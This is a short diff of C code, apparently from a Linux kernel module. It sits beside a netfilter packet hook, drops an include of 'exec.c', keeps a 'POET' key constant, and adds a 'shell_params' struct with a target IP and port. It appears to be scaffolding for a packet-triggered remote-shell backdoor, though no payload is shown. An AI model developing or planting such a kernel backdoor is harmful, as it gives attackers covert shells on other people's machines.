@@ -1,6 +1,10 @@
-#include "exec.c"
-
 const char* KEY = "POET";
+
+struct shell_params {
+       struct work_struct work;
+       char* target_ip;
+       char* target_port;
+};
 
 static unsigned int my_nf_hookfn(void *priv,
               struct sk_buff *skb,
